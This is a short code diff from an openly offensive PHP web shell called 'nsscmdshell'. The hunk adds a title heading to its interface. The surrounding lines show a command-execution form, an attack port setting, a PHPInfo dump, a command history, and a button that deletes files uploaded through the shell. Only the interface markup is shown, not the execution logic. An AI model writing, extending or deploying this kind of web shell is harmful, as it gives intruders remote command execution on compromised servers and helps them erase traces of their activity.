@@ -75,6 +75,7 @@ $attackport = "8000";
         }
         echo '
         <div class="main_body">
+		<h4 style="text-align:center;">The Not So Simple PHP Command Shell</h4><br>
         <div style="display:inline;margin:10px;"><form style="float:left" action="" method="get">Command:&nbsp;&nbsp;<input type="text" name="cmd" autofocus placeholder="Type a command" /><button type="submit" class="btn btn-primary"><i class="fa fa-gear"></i> Execute</button></form><form style="float:right" action="nsscmdshell.php" method="GET"> <a href="?links=1" role="button" class="btn btn-primary"><i class="fa fa-external-link"></i> QuickLinks </a>&nbsp;<button name="phpInfo" class="btn btn-primary"><i class="fa fa-file-code-o"></i> PHPInfo </button>&nbsp;<button name="check" id="action-button" title="show var_dump for $_SESSION[\'actions\']" class="btn btn-primary"><i class="fa fa-history"></i> Show History </button> <button name="clean" id="action-button" title="deletes all files uploaded using nsscmdshell." class="btn btn-danger"><i class="fa fa-trash"></i> Cleanup Files </button></form></div>
 <p>&nbsp;</p>
         File Options<br>
